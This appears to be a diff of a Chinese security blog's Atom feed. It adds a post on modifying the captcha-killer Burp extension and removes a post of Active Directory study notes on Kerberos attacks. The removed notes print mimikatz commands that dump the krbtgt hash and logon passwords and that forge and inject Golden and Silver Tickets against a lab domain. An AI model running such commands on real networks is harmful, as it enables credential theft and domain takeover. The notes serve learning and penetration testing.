@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://thekingofduck.github.io</id>
     <title>CoolCat&apos; Blog</title>
-    <updated>2020-06-27T16:52:27.329Z</updated>
+    <updated>2020-08-08T11:23:13.342Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://thekingofduck.github.io"/>
     <link rel="self" href="https://thekingofduck.github.io/atom.xml"/>
@@ -10,6 +10,38 @@
     <logo>https://thekingofduck.github.io/images/avatar.png</logo>
     <icon>https://thekingofduck.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, CoolCat&apos; Blog</rights>
+    <entry>
+        <title type="html"><![CDATA[captcha-killer修改随笔]]></title>
+        <id>https://thekingofduck.github.io/post/recode-captcha-killer/</id>
+        <link href="https://thekingofduck.github.io/post/recode-captcha-killer/">
+        </link>
+        <updated>2020-08-08T09:50:14.000Z</updated>
+        <content type="html"><![CDATA[<p>成品如下:</p>
+<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1596880625428.png" alt="" loading="lazy"></figure>
+<p>新增功能特性:<br>
+1.当验证码结果返回值非图标时，使用自定义正则匹配验证码位置。<br>
+2.当识别出匹配结果为图标时自动锁定正则输入框以及匹配按钮。<br>
+3.针对团队购买的识别接口返回值预设正则, etc...</p>
+<p>适应新场景：<br>
+requests:</p>
+<pre><code>GET /xxxx.ashx?op=getVerifyCodeImage HTTP/1.1
+Host: www.baidu.com
+</code></pre>
+<p>response:</p>
+<pre><code>{&quot;success&quot;:true,&quot;image&quot;:&quot;图标的base64值&quot;}
+</code></pre>
+<p>输入正则:</p>
+<pre><code>&quot;success&quot;:true,&quot;image&quot;:&quot;(.*?)&quot;
+</code></pre>
+<p>即可正常识别。</p>
+<p>修改过的位置<br>
+<img src="https://thekingofduck.github.io/post-images/1596881092380.png" alt="" loading="lazy"></p>
+<p>如图中代码所示，原作者提了一个burp自带的发包，无法指定超时这个问题，有趣的是自己印象中超时一直都是再Intruder的超时是可以在option中指定的。</p>
+<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1596881494055.jpeg" alt="" loading="lazy"></figure>
+<p>认真看了一下pause before retry和超时没半毛钱关系，一直以来都看错了...</p>
+<p>问题其实出在MorePayloads的判断上，原代码未判断是否有新的payload生成，直接无条件的返回true，这一来即便请请求第三方网站的识别结果尚未回来，burp也认为有新的Payload生成了，直接调自然就只能返回空了。</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Copy2Yaml:一键生成yaml poc]]></title>
         <id>https://thekingofduck.github.io/post/copy2yaml/</id>
@@ -358,125 +390,6 @@ function burpJsEncrypter(rawPayload){
 <li>WX:TheKingOfGaGaGa</li>
 <li>Github:<a href="https://github.com/TheKingOfDuck">https://github.com/TheKingOfDuck</a></li>
 </ul>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[域渗透学习笔记五：攻击Kerbroes]]></title>
-        <id>https://thekingofduck.github.io/post/ADStudy-Part-5-Attack-Kerbroes/</id>
-        <link href="https://thekingofduck.github.io/post/ADStudy-Part-5-Attack-Kerbroes/">
-        </link>
-        <updated>2020-03-04T10:10:16.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="用户名遍历">用户名遍历</h3>
-<p>回顾Kerbroe的认证流程第一步：</p>
-<ul>
-<li>1.Client请求Kerberos服务(请求中包含了Client Name 也就是用户名)，如果主机名存在于ad中，就放回TGT给Client</li>
-</ul>
-<p>如果Web测试做的多就知道第一步就存在用户名遍历问题。</p>
-<p><a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a></p>
-<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583318637446.png" alt="" loading="lazy"></figure>
-<h3 id="票据伪造">票据伪造</h3>
-<h4 id="golden-ticket">Golden Ticket</h4>
-<p>AS_REP里面的ticket的encpart是使用krbtgt的hash进行加密的的来的，krbtgt用户的hash也是可以提取出来的，这就意味着ticket是可以自己计算出来的。Golden Ticket就是自己计算TGT去生成的TGS，换在买车票的比喻中就相当于伪造身份证去买票。</p>
-<p><strong>Golden Ticket价值和域控相似</strong></p>
-<p>伪造条件：</p>
-<ul>
-<li>Domain SID</li>
-<li>Domain name</li>
-<li>需要krbtgt用户的hash</li>
-<li>用户名随意</li>
-</ul>
-<p>伪造过程</p>
-<p>1.获取krbtgt hash</p>
-<pre><code>mimikatz &quot;lsadump::dcsync /OWA2010SP3.0day.org /user:krbtgt&quot; &quot;exit&quot; &gt; krbtgthash.txt
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583324821594.png" alt="" loading="lazy"></figure>
-<p>2.生成票据文件</p>
-<pre><code>mimikatz &quot;kerberos::golden /admin:CoolCat /domain:adstudy.com /sid:S-1-5-21-290613818-3246529070-3099575750 /krbtgt:b0164177afec62432418903208c1e247 /ticket:golden.kiribi&quot;  &quot;exit&quot;
-</code></pre>
-<p>其中sid最后一个“-”之后的要去掉，这个很细节。<br>
-<img src="https://thekingofduck.github.io/post-images/1583326167707.png" alt="" loading="lazy"></p>
-<p>3.将票据文件导入内存</p>
-<pre><code>mimikatz &quot;kerberos::purge&quot; &quot;kerberos::ptt golden.kiribi&quot; &quot;kerberos::list&quot; &quot;exit&quot;
-</code></pre>
-<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583326531630.png" alt="" loading="lazy"></figure>
-<p>图中红线前后为导入金票前后的权限差异。</p>
-<p>值得一提的是目前这个金票只能在域内使用使用，不能跨域，涉及到跨域，域森林时该金票就被局限了，不过可以配合SIDHistory去生成包含根域的金票。</p>
-<p>可参考：http://t3ngyu.leanote.com/post/7697c6e55644</p>
-<h4 id="silver-tickets">Silver Tickets</h4>
-<p>已知目标机器的NTLM hash和域SID时，可以伪造任意用户访问目标机器上的指定服务。其过程不会与KDC通信，因此不会再KDC上留下任何痕迹，只会在目标机器和本机留下日志。可以利用的服务：</p>
-<table>
-<thead>
-<tr>
-<th>服务注释</th>
-<th>服务名称</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>WMI</td>
-<td>HOST&amp;RPCSS</td>
-</tr>
-<tr>
-<td>Powershell Remoteing</td>
-<td>HOST&amp;HTTP</td>
-</tr>
-<tr>
-<td>WinRM</td>
-<td>HOST&amp;HTTP</td>
-</tr>
-<tr>
-<td>Scheduled Tasks</td>
-<td>HOST</td>
-</tr>
-<tr>
-<td>LDAP、DCSync</td>
-<td>LDAP</td>
-</tr>
-<tr>
-<td>Windows File Share（CIFS）</td>
-<td>CIFS</td>
-</tr>
-<tr>
-<td>Windows Remote Server Administration Tools</td>
-<td>RPCSS&amp;LDAP&amp;CIFS</td>
-</tr>
-</tbody>
-</table>
-<p>伪造条件</p>
-<ul>
-<li>
-<p>Domain SID</p>
-</li>
-<li>
-<p>Domain name</p>
-</li>
-<li>
-<p>目标机器的NTLM hash</p>
-</li>
-<li>
-<p>任意用户</p>
-<p>伪造过程：</p>
-<p>导出目标机器的hash：</p>
-</li>
-</ul>
-<pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot; &gt; hash.txt
-</code></pre>
-<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583327211454.png" alt="" loading="lazy"></figure>
-<pre><code>mimikatz &quot;kerberos::golden /domain:adstudy.com /sid:S-1-5-21-290613818-3246529070-3099575750 /target:bot.adstudy.com /service:cifs /rc4:b0f256f8b3bca01555101864efef02ac /user:silver /ptt&quot; &quot;exit&quot;
-</code></pre>
-<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583329253794.png" alt="" loading="lazy"></figure>
-<p>伪造成功后可使用klist查看票据,指令中伪造的服务是cifs，即Windows File Share（CIFS），在域内机器上测试的，本身就没限制，所以伪造了银票也没啥子用，就不截图了，如果伪造其他有权限限制机器上的服务即可越过限制。</p>
-<h3 id="总结">总结</h3>
-<p>金票权限大，但是要过kdc，会留下日志。<br>
-银票局限在特定服务内使用，不过kdc，只在域服务机器上留下日志。</p>
-<p>两者分别去读hash时都需要管理员权限，这是致命的缺陷，在攻击过程中就出现：</p>
-<p>&quot;有管理权限就可以直接读管理密码了，要金票银票何用？&quot;</p>
-<blockquote>
-<p>可以用在权限维持上。</p>
-</blockquote>
-<p>参考文章：</p>
-<p><a href="http://t3ngyu.leanote.com/post/Silver-Tickets">域渗透-权限维持之 Silver Tickets</a><br>
-<a href="https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.md">域渗透-Ticket</a></p>
 ]]></content>
     </entry>
 </feed>
